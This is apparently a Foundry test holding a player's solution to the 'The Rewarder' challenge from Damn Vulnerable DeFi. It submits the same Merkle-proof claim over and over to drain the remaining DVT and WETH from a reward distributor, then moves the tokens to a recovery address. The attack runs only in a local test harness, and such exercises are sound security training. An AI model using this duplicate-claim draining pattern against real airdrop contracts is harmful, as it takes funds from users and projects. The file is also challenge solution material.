...
contract TheRewarderChallenge is Test {
    ...
    function setUp() public {
        ...
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}(); // THE WETH CONTRACT WILL DEPLOY THIS MANY WETH TOKENS TO THE deployer.

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves); // THIS FUNCTION TAKES IN ALL THE LEAVES AND CALCULATES THE MERKEL ROOT.
        wethRoot = merkle.getRoot(wethLeaves); // THIS FUNCTION TAKES IN ALL THE LEAVES AND CALCULATES THE MERKEL ROOT.
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        console.log("Total DVT tokens present in the TheRewarderDistributor contract after Alice's claim: ", dvt.balanceOf(address(distributor)));
        console.log("Total WETH tokens present in the TheRewarderDistributor contract after Alice's claim: ", weth.balanceOf(address(distributor)));

        console.log("Address of the player: ", player);
        console.log("Address of the recovery: ", recovery);

        console.log("Balance of DVT tokens in the player", dvt.balanceOf(player));
        console.log("Balance of WETH tokens in the player", weth.balanceOf(player));

        console.log("The remaining balance in DVT token: ", distributor.getRemaining(address(dvt)));
        console.log("The next batch number in DVT token: ", distributor.getNextBatchNumber(address(dvt)));
        // console.log("The merkel root in the DVT token: ", distributor.getRoot(address(dvt), 0));
        distributor.getRoot(address(dvt), 0); // console.log will not work with this. Therefore, see the log instead.

        console.log("The remaining balance in WETH token: ", distributor.getRemaining(address(weth)));
        console.log("The next batch number in WETH token: ", distributor.getNextBatchNumber(address(weth)));
        // console.log("The merkel root in the WETH token: ", distributor.getRoot(address(weth), 0));
        distributor.getRoot(address(weth), 0); // console.log will not work with this. Therefore, see the log instead.

        /*
        calculate the line number of the player address in the .json files
        jq -r '.[].address' /home/kali/Desktop/DamnVulnerableDefi/damn-vulnerable-defi/test/the-rewarder/dvt-distribution.json | nl -v 1 | grep -i '0x44E97aF4418b7a17AABD8090bEA0A471a366305C'
            -> 189	0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        therefore, index of the address to put in the function for merkel proof is: 188
        */
        
        uint256 max_attacker_dvt_claim_amount = 11524763827831882;
        uint256 max_attacker_weth_claim_amount = 1171088749244340;

        uint256 total_remaining_dvt_balance = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        uint256 total_remaining_weth_balance = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;

        uint256 times_to_withdraw_dvt = total_remaining_dvt_balance/max_attacker_dvt_claim_amount;
        uint256 times_to_withdraw_weth = total_remaining_weth_balance/max_attacker_weth_claim_amount;
        uint256 total_times_to_withdraw = times_to_withdraw_dvt + times_to_withdraw_weth;
        ...
        // Create attacker's/player claims
        Claim[] memory claims = new Claim[](times_to_withdraw_dvt + times_to_withdraw_weth);
        ...
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: max_attacker_dvt_claim_amount,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        ...
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: max_attacker_weth_claim_amount,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
        });
        */
        
        // Create attacker's/player claims dvt
        for (uint256 i=0; i<= total_times_to_withdraw-1; i++){
            if(i <= times_to_withdraw_dvt-1){
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: max_attacker_dvt_claim_amount,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        ...
        // sending the tokens to the recovery account
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

        console.log("Balance of DVT tokens in the player", dvt.balanceOf(player));
        console.log("Balance of WETH tokens in the player", weth.balanceOf(player));
        console.log("Balance of DVT tokens in the recovery", dvt.balanceOf(recovery));
        console.log("Balance of WETH tokens in the recovery", weth.balanceOf(recovery));
    }
